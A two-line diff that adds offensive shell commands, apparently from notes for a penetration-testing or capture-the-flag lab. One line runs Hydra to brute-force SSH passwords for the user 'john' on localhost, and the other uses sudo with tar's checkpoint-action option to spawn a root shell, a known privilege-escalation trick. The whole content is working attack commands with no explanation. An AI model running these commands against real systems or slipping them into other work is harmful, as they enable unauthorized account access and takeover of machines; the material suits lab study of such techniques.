@@ -1,0 +1,2 @@
+hydra -l john -P passwordlist -t 6 ssh://localhost
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
